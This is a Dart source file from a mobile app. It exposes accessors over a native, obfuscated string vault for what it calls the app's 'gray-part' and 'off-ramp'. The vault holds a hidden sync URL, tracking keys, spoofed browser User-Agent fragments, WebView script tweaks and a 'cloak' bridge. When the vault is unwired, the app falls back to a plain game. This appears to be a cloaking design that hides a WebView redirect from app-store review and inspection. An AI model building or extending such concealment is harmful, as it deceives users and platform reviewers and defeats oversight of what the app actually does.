import '../cloak/burrow.dart';

// ============================================================
// STOWED BYTES — accessors for the gray-part string vault
// ============================================================
// The off-ramp strings no longer live in the Dart snapshot at all —
// they moved into the native `burrow` guard (native/burrow), which
// holds them obfuscated and hands back one de-obfuscated string per
// `reveal()` call. This file is now a thin, named facade over the
// guard's numeric selectors so the rest of the off-ramp keeps calling
// `pull*()` exactly as before.
//
// To change a value, edit tool/burrow_gen.dart and regenerate:
//   dart run tool/burrow_gen.dart
// then rebuild so the native crate picks up the new bytes.
//
// An empty return => the value is "not wired yet" and the caller
// degrades to the native game.
// ============================================================

// ── Edge relay + attribution ──────────────────────────────────
String pullSyncUrl() => reveal(Sel.syncUrl);

/// True when the config endpoint is wired. Does not reveal the URL.
bool pullSyncUrlPresent() => revealLen(Sel.syncUrl) > 0;
String pullSealKey() => reveal(Sel.sealKey);
String pullGcdBase() => reveal(Sel.gcdBase);
String pullTrackKey() => reveal(Sel.trackKey);
String pullFcmProject() => reveal(Sel.fcmProject);

// ── User-Agent fragments ──────────────────────────────────────
String pullMarkProduct() => reveal(Sel.markProduct);
String pullMarkPlatform() => reveal(Sel.markPlatform);
String pullMarkBuildTag() => reveal(Sel.markBuildTag);
String pullMarkPlatformEnd() => reveal(Sel.markPlatformEnd);
String pullMarkEngine() => reveal(Sel.markEngine);
String pullMarkEngineTail() => reveal(Sel.markEngineTail);
String pullMarkVendor() => reveal(Sel.markVendor);
String pullMarkMobile() => reveal(Sel.markMobile);
String pullChromeRev() => reveal(Sel.chromeRev);
String pullWebkitRev() => reveal(Sel.webkitRev);

// ── WebView JS tweaks ─────────────────────────────────────────
String pullTweakSafeArea() => reveal(Sel.tweakSafeArea);
String pullTweakAutoplay() => reveal(Sel.tweakAutoplay);
String pullTweakKeyboard() => reveal(Sel.tweakKeyboard);
String pullTweakSeatHook() => reveal(Sel.tweakSeatHook);

// ── Off-ramp bridge names (channel + methods) ─────────────────
String pullIoChannel() => reveal(Sel.ioChannel);
String pullIoPick() => reveal(Sel.ioPick);
String pullIoIme() => reveal(Sel.ioIme);
String pullIoCloak() => reveal(Sel.ioCloak);

// ── Notification opt-in screen copy ───────────────────────────
String pullOptinTitle() => reveal(Sel.optinTitle);
String pullOptinBody() => reveal(Sel.optinBody);

// ── Gray-part constants (numeric + edge-wire shape) ───────────
// Parsed from the guard with a safe fallback so the gate still works
// when the vault is not wired (QA / template state).
int _int(int sel, int fallback) {
  final String s = reveal(sel);
  if (s.isEmpty) return fallback;
  return int.tryParse(s) ?? fallback;
}

int pullOptinSnoozeSeconds() => _int(Sel.optinSnoozeSeconds, 258972);
int pullOrganicRescueDelay() => _int(Sel.organicRescueDelay, 9);
int pullDecisionTimeoutSeconds() => _int(Sel.decisionTimeoutSeconds, 21);
int pullFirstInstallWaitSeconds() => _int(Sel.firstInstallWaitSeconds, 33);
int pullReturningInstallWaitSeconds() =>
    _int(Sel.returningInstallWaitSeconds, 8);
int pullDeepLinkWaitSeconds() => _int(Sel.deepLinkWaitSeconds, 6);
int pullReachTimeoutSeconds() => _int(Sel.reachTimeoutSeconds, 8);
int pullReachDropDebounceMs() => _int(Sel.reachDropDebounceMs, 950);
int pullRedirectLoopRetries() => _int(Sel.redirectLoopRetries, 3);
int pullCachedUrlTtlSeconds() => _int(Sel.cachedUrlTtlSeconds, 604800);
int pullNativeRetryGapSeconds() => _int(Sel.nativeRetryGapSeconds, 3);
int pullEnvelopeRev() => _int(Sel.envelopeRev, 17);
String pullFieldSchema() => reveal(Sel.fieldSchema);
String pullFieldNonce() => reveal(Sel.fieldNonce);
String pullFieldPayload() => reveal(Sel.fieldPayload);
String pullFieldTag() => reveal(Sel.fieldTag);

/// AppsFlyer GCD rescue URL for an install; "" when the base is absent.
String pullGcdCallUrl(String applicationId, String deviceId) {
  final String base = pullGcdBase();
  if (base.isEmpty) return '';
  return '$base$applicationId?devkey=${pullTrackKey()}&device_id=$deviceId';
}
